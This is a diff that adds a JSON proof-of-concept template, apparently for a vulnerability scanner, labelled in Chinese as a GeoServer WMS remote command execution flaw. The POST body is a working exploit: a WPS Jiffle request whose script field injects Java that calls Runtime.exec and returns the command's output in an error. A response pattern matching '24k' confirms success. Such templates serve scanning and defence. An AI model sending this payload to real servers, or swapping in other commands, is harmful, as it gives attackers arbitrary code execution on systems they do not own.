@@ -1,0 +1,20 @@
+{
+	"name":"GeoServer系统wms接口存在远程命令执行",
+	"tag":"geoserver",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/geoserver/wms",
+		"pocPost":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n  <wps:Execute version=\"1.0.0\" service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\" xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\" xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\">\r\n    <ows:Identifier>ras:Jiffle</ows:Identifier>\r\n    <wps:DataInputs>\r\n      <wps:Input>\r\n        <ows:Identifier>coverage</ows:Identifier>\r\n        <wps:Data>\r\n          <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\r\n        </wps:Data>\r\n      </wps:Input>\r\n      <wps:Input>\r\n        <ows:Identifier>script</ows:Identifier>\r\n        <wps:Data>\r\n          <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"echo 24k\").getInputStream())); String line = null; String allLines = \" - \"; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\r\n        </wps:Data>\r\n      </wps:Input>\r\n      <wps:Input>\r\n        <ows:Identifier>outputType</ows:Identifier>\r\n        <wps:Data>\r\n          <wps:LiteralData>DOUBLE</wps:LiteralData>\r\n        </wps:Data>\r\n      </wps:Input>\r\n    </wps:DataInputs>\r\n    <wps:ResponseForm>\r\n      <wps:RawDataOutput mimeType=\"image/tiff\">\r\n        <ows:Identifier>result</ows:Identifier>\r\n      </wps:RawDataOutput>\r\n    </wps:ResponseForm>\r\n  </wps:Execute>",
+		"header":{
+			"Accept":" */*",
+			"Expect":" 100-continue",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate",
+			"Content-Length":" 1967",
+			"Content-Type":" application/xml"
+		},
+		"status_code":"200",
+		"pattern":"(24k)"
+	}
+}
